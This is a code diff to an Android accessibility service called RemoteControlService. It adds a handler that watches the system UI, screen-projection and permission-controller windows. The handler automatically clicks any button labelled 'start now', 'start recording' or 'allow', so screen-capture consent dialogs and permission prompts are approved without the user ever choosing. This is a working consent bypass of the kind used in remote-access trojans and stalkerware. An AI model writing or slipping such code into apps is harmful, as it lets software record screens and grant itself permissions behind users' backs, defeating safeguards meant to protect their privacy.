@@ -5,6 +5,8 @@ import android.accessibilityservice.GestureDescription
 import android.graphics.Path
 import android.view.accessibility.AccessibilityEvent
 
+import android.view.accessibility.AccessibilityNodeInfo
+
 class RemoteControlService : AccessibilityService() {
 
   override fun onServiceConnected() {
@@ -13,7 +15,32 @@ class RemoteControlService : AccessibilityService() {
   }
 
   override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-    // No-op: we only need gesture injection capability
+    if (event == null) return
+    try {
+      val packageName = event.packageName?.toString() ?: ""
+      if (packageName.contains("systemui") || packageName.contains("projection") || packageName.contains("permissioncontroller")) {
+        val rootNode = rootInActiveWindow ?: return
+        autoClickStartNow(rootNode)
+      }
+    } catch (e: Exception) {
+      e.printStackTrace()
+    }
+  }
+
+  private fun autoClickStartNow(node: AccessibilityNodeInfo?) {
+    if (node == null) return
+    val text = node.text?.toString()?.lowercase() ?: ""
+    val contentDescription = node.contentDescription?.toString()?.lowercase() ?: ""
+
+    if (text.contains("start now") || text.contains("start recording") || text.contains("allow") ||
+        contentDescription.contains("start now") || contentDescription.contains("start recording")) {
+      node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+      return
+    }
+
+    for (i in 0 until node.childCount) {
+      autoClickStartNow(node.getChild(i))
+    }
   }
 
   override fun onInterrupt() {
